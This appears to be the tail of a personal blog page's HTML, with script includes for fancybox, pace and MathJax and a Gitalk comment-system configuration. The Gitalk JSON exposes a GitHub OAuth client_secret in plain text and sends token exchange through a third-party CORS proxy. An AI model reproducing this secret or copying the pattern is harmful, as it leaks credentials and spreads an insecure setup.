  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.33/fancybox/fancybox.umd.js" integrity="sha256-+2+qOqR8CKoHh/AsVR9k2qaDBKWjYNC2nozhYmv5j9k=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  



  <script src="/js/third-party/fancybox.js"></script>

  <script src="/js/third-party/pace.js"></script>


  




  

  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","mhchem":false,"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
<script src="/js/third-party/math/mathjax.js"></script>


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">

<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"kyrios0","repo":"kyrios0.github.io","client_id":"6cd5e006f4344b4ef21b","client_secret":"ee2b76bf152d51927924c4699df0df26805c9aab","admin_user":"kyrios0","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":null,"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.min.js","integrity":"sha256-MVK9MGD/XJaGyIghSVrONSnoXoGh3IFxLw0zfvzpxR4="},"path_md5":"1276eb677c7d1dd5f813c22c0084921e"}</script>
<script src="/js/third-party/comments/gitalk.js"></script>

</body>
</html>
